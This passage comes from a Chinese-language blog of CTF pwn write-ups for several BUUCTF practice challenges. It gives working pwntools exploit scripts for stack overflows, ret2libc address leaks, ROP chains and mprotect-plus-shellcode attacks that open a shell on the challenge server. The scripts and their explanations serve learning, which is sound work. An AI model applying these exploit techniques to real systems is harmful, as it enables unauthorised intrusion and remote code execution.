Zino</span><br><span class="hljs-comment"># 221012</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/ciscn_2019_n_1&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x0804845C</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>但是如果其中system取的是call跳转后的，也就是system实际的地址，这时需要再加一个返回地址，以模拟真实的函数调用过程，如果是call就不用加，因为call会自己将返回地址压栈</p><p><img src="/posts/ed20bbdc/Untitled%2045.png" alt="Untitled"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221012</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27337</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/kali/buuctf/ciscn_2019_n_1&#x27;)</span><br>bin_sh=<span class="hljs-number">0x0804A024</span><br>system=<span class="hljs-number">0x08048320</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(system)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="bjdctf_2020_babystack"><a class="markdownIt-Anchor" href="#bjdctf_2020_babystack"></a> bjdctf_2020_babystack</h2><p>查看保护机制，可以栈溢出</p><p><img src="/posts/ed20bbdc/Untitled%2046.png" alt="Untitled"></p><p>代码很简单，两次输入，第一次输入长度，第二次输入会存进buf,这里可以栈溢出</p><p><img src="/posts/ed20bbdc/Untitled%2047.png" alt="Untitled"></p><p>再看一下，存在backdoor函数</p><p><img src="/posts/ed20bbdc/Untitled%2048.png" alt="Untitled"></p><p>然后本地ubuntu运行时，payload里需要再加一个ret，还是栈平衡的问题，不过远程加和不加都能打通。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221012</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25991</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/zino/buuctf/bjdctf_2020_babystack&#x27;)</span><br>back_door=<span class="hljs-number">0x4006E6</span><br>io.sendlineafter(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>,<span class="hljs-string">&#x27;100&#x27;</span>)<br>ret = <span class="hljs-number">0x4007CB</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(back_door)<br><span class="hljs-built_in">print</span>(payload)<br>io.sendlineafter(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="ogeek2019babyrop"><a class="markdownIt-Anchor" href="#ogeek2019babyrop"></a> [OGeek2019]babyrop</h2><p><img src="/posts/ed20bbdc/Untitled%2049.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2050.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2051.png" alt="Untitled"></p><p><img src="/posts/ed20bbdc/Untitled%2052.png" alt="Untitled"></p><p>看下函数的意思，可以发现是让我们输入一个数，然后会和一个系统的随机数比较，不相同就会退出程序，因为strncmp遇到‘\x00’会终止计算，因为我们可以通过将输入第一位置为‘\x00’来规避比较，使得程序不退出。</p><p>同时在最后一个函数，可以发现，a1就是上一个函数的返回，所以只要在上一个函数输入的时候将其设置为‘\xff’这就是十进制的255，这个大小就够我们填充buf了。</p><p>然后就是ret2libc，可以通过write函数来泄露libc的地址。但是这个方法在本地可以打通，远程却不行，找到的libc库没一个对的，后来发现题目提供了libc2.23，用这个来获取system函数地址就成功了。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221015</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27358</span>)<br>elf=ELF(<span class="hljs-string">&#x27;/home/zino/buuctf/pwn1&#x27;</span>)<br>lib=ELF(<span class="hljs-string">&#x27;/home/zino/buuctf/libc-2.23.so&#x27;</span>)<br><span class="hljs-comment"># io=process(&#x27;/home/zino/buuctf/pwn1&#x27;)</span><br><span class="hljs-comment">#第一次填充缓冲区，使得程序不退出</span><br>junk=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span><br>payload=junk<br>io.sendline(payload)<br>io.recv()<br><br><span class="hljs-comment"># 泄露write地址</span><br>write_plt=elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>write_got=elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>main_addr= <span class="hljs-number">0x08048825</span><br><span class="hljs-comment"># 1和4是write的两个参数，第一个参数1表示输出到终端，第二个参数就是输出内容，第三个参数4表示4个字节</span><br><span class="hljs-comment"># main_addr就是返回地址，用以重新执行这个程序</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>)+p32(write_plt)+p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>io.sendline(payload)<br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<br><br><span class="hljs-comment"># 获取system和binsh地址</span><br><br><span class="hljs-comment"># #本地版本</span><br><span class="hljs-comment"># libc=LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-comment"># base=write_addr-libc.dump(&quot;write&quot;)</span><br><span class="hljs-comment"># system=base+libc.dump(&quot;system&quot;)</span><br><span class="hljs-comment"># bin_sh=base+libc.dump(&quot;str_bin_sh&quot;)</span><br><br><span class="hljs-comment"># 远程版本</span><br><br>base=write_addr-lib.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br>system=base+lib.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>bin_sh=base+<span class="hljs-built_in">next</span>(lib.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br><span class="hljs-comment">#执行ROP攻击</span><br>payload=junk<br>io.sendline(payload)<br>io.recv()<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xE7</span>+<span class="hljs-number">4</span>)+p32(system)+ <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>  + p32(bin_sh) <br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="get_started_3dsctf_2016"><a class="markdownIt-Anchor" href="#get_started_3dsctf_2016"></a> <strong>get_started_3dsctf_2016</strong></h2><p><img src="/posts/ed20bbdc/Untitled%2053.png" alt="Untitled"></p><p>还是不可执行栈，可以进行栈溢出</p><p>反汇编代码如下:</p><p><img src="/posts/ed20bbdc/Untitled%2054.png" alt="Untitled"></p><p>存在get_flag函数，不过这个函数需要比较两个参数，相同才可以进入下一步</p><p><img src="/posts/ed20bbdc/Untitled%2055.png" alt="Untitled"></p><p>不过可以考虑直接跳过if语句，直接ret进入if里面的子句</p><p><img src="/posts/ed20bbdc/Untitled%2056.png" alt="Untitled"></p><p>本地可以，远程不行的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#elf = ELF(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29396</span>)<br><br>getflag = <span class="hljs-number">0x080489B8</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(getflag)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>但是这个版本可以打通本地，却无法打通远程，后来看了师傅们的博客才知道应该是远程的栈没有平衡，导致程序异常退出了，从而没有回显（本地为什么可以嘞）。</p><h3 id="解法1"><a class="markdownIt-Anchor" href="#解法1"></a> 解法1</h3><p>因此考虑另一种解法，正常进入get_flag，并设置其返回地址为exit函数，同时也设置get_flag的参数，使得程序最终可以正常退出。这样就可以成功回显了。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#elf = ELF(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29396</span>)<br><br>exit_addr = <span class="hljs-number">0x0804e6a0</span><br>getflag = <span class="hljs-number">0x080489B8</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(getflag)+p32(exit_addr)+p32(<span class="hljs-number">0x308CD64F</span>)+p32(<span class="hljs-number">0x195719D1</span>)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></div></td></tr></table></figure><h3 id="解法2"><a class="markdownIt-Anchor" href="#解法2"></a> 解法2</h3><p>利用mprotect修改内存权限，使得内存可读可写可执行</p><p>mprotect<strong>函数原型:</strong> <code>int mprotect(const void *startaddr, size_t len, int prot);</code></p><p>**参数：**startaddr 内存启始地址, len修改内存的长度, prot 内存的权限</p><p>再用read函数将shellcode写入这个被修改了权限的内存地址，然后使控制流运行该处的shellcode</p><p>read<strong>函数原型</strong>： <code>int read(int handle,void *buf,int len);</code></p><p><strong>参数</strong>：handle 为要读取的文件，*buf  为要将读取的内容保存的缓冲区，len    读取文件的长度</p><p>首先用ROPgeget指令找到具有三个pop的指令地址，有很多，随便来一个都行</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">ROPgadget --binary get_started_3dsctf_2016 --only <span class="hljs-string">&quot;pop|ret&quot;</span> | grep <span class="hljs-string">&quot;;&quot;</span><br></code></pre></div></td></tr></table></figure><p><img src="/posts/ed20bbdc/Untitled%2057.png" alt="Untitled"></p><p>用gdb中的vmmap指令查看内存分布</p><p><img src="/posts/ed20bbdc/Untitled%2058.png" alt="Untitled"></p><p>我们可以选择数据段来作为修改内存权限的地址（测试了下，代码段、数据段、堆修改权限后都能成功，rodata和stack没有成功）</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29396</span>)<br><br>mem_addr= <span class="hljs-number">0x80ea000</span><br>pop_3_ret=<span class="hljs-number">0x0804f460</span><br><br>mprotect_addr=elf.symbols[<span class="hljs-string">&quot;mprotect&quot;</span>]<br>read_addr=elf.symbols[<span class="hljs-string">&quot;read&quot;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span><br>payload += p32(mprotect_addr)  <span class="hljs-comment">#调用mprotect</span><br>payload += p32(pop_3_ret)      <span class="hljs-comment">#调用完返回这里，将下面的三个参数出栈</span><br>payload += p32(mem_addr)       <span class="hljs-comment">#要修改权限的内存地址</span><br>payload += p32(<span class="hljs-number">0x1000</span>)         <span class="hljs-comment">#修改长度，要和页对齐</span><br>payload += p32(<span class="hljs-number">0x7</span>)            <span class="hljs-comment">#7表示rwx都有</span><br><br>payload += p32(read_addr)      <span class="hljs-comment">#调用read</span><br>payload += p32(pop_3_ret)      <span class="hljs-comment">#调用完返回这里，将下面的三个参数出栈</span><br>payload += p32(<span class="hljs-number">0x0</span>)            <span class="hljs-comment">#0表示从终端读入</span><br>payload += p32(mem_addr)       <span class="hljs-comment">#目标地址</span><br>payload += p32(<span class="hljs-number">0x100</span>)          <span class="hljs-comment">#读入长度</span><br><br>payload += p32(mem_addr)       <span class="hljs-comment">#执行这里面的shellcode</span><br><br>io.sendline(payload)<br>shellcode= asm(shellcraft.sh())<br>io.sendline(shellcode)<br><br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="jarvisoj_level2_x64"><a class="markdownIt-Anchor" href="#jarvisoj_level2_x64"></a> jarvisoj_level2_x64</h2><p>这题和前面的<a href="#jarvisoj_level2">jarvisoj_level2</a>基本上相同，就是从32位换成了64位，唯一的不同就是32位直接将参数压栈即可，64位的话就是把参数依次放入rdi、rsi、rdx、rcx寄存器中，这里我们调用system函数只有一个参数，所以我们需要一个pop rdi指令，用ROPgadget指令找一下这个指令，然后将binsh作为参数压入rdi中即可。</p><p><img src="/posts/ed20bbdc/Untitled%2059.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28765</span>)<br><br>bin_sh=<span class="hljs-number">0x600A90</span><br>system=<span class="hljs-number">0x40063E</span><br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="harekazectf2019baby_rop"><a class="markdownIt-Anchor" href="#harekazectf2019baby_rop"></a> [HarekazeCTF2019]baby_rop</h2><p>查看文件信息</p><p><img src="/posts/ed20bbdc/image-20221021192436240-16663516187941.png" alt="image-20221021192436240"></p><p>在ida里看下，很简单，scanf会使得栈溢出</p><p><img src="/posts/ed20bbdc/image-20221021192712377.png" alt="image-20221021192712377"></p><p>同时shift+F12打开字符串窗口，可以发现存在system和binsh</p><p><img src="/posts/ed20bbdc/image-20221021193159747.png" alt="image-20221021193159747"></p><p>由此我们可以通过栈溢出后执行system(&quot;/bin/sh&quot;)来提权</p><p><img src="/posts/ed20bbdc/image-20221021192423352.png" alt="image-20221021192423352"></p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27100</span>)<br><br>bin_sh=<span class="hljs-number">0x601048</span><br>system=<span class="hljs-number">0x4005E3</span><br>pop_rdi=<span class="hljs-number">0x400683</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">8</span>)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="ciscn_2019_en_2"><a class="markdownIt-Anchor" href="#ciscn_2019_en_2"></a> ciscn_2019_en_2</h2><p>做了以后发现和ciscn_2019_c_1一模一样，直接过</p><p><img src="/posts/ed20bbdc/image-20221021193431853.png" alt="image-20221021193431853"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Create By Zino</span><br><span class="hljs-comment"># 221021</span><br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> popen<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_en_2&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local == <span class="hljs-number">1</span>:<br>    io = process(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br>    <span class="hljs-comment"># gdb.attach(io)</span><br>    <span class="hljs-comment"># time.sleep(5)</span><br>    <br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28720</span>)<br><br><br>io.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>offset=<span class="hljs-number">0x50</span><br>junk=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)<span class="hljs-comment">#首位填‘\0’,绕过加密，之后填上a覆盖到返回地址</span><br>main = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]          <span class="hljs-comment">#获取main函数地址</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]            <span class="hljs-comment">#获取puts函数plt表中地址</span><br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]            <span class="hljs-comment">#获取puts函数got表中的地址</span><br>pop_rdi_ret=<span class="hljs-number">0x0000000000400c83</span>      <span class="hljs-comment">#ROPgadget找到的 pop rdi；ret指令地址</span><br>ret=<span class="hljs-number">0x00000000004006b9</span>              <span class="hljs-comment">#栈平衡，使其对齐0x10</span><br><br><span class="hljs-comment">#首先填入pop rdi ret指令，这正好会将puts_got地址压入rdi中，作为puts函数的参数，这样就可以打印出这个put的真实地址</span><br><span class="hljs-comment">#然后加上main函数的地址，使得打印完后函数控制流回到main开始的地方，重新开始执行一次以便实施攻击</span><br>payload=junk+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>io.recvline()                       <span class="hljs-comment">#encryp函数在return前还有两行输入，接收掉</span><br>io.recvline()<br><span class="hljs-comment">#获取puts地址，[:-1]过滤掉最后的\n,ljust获取前八字节，不足补\0,u64解包二进制串成int形式</span><br>puts_addr= u64(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))  <br><span class="hljs-comment">#hex将一个int数表示成16进制形式</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr)  <span class="hljs-comment">#利用LibcSearcher模块找到匹配的libc版本</span><br>base=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)     <span class="hljs-comment">#获取基址</span><br>bin_sh=base+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)  <span class="hljs-comment">#获取binsh地址</span><br>system=base+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)      <span class="hljs-comment">#获取system函数地址</span><br><br>io.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>) <span class="hljs-comment">#选择选项1、encrypt</span><br><span class="hljs-comment">#binsh字符串起始地址压入edi，作为system函数的参数，然后调用system函数</span><br>payload=junk+p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)<br>io.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h2 id="not_the_same_3dsctf_2016"><a 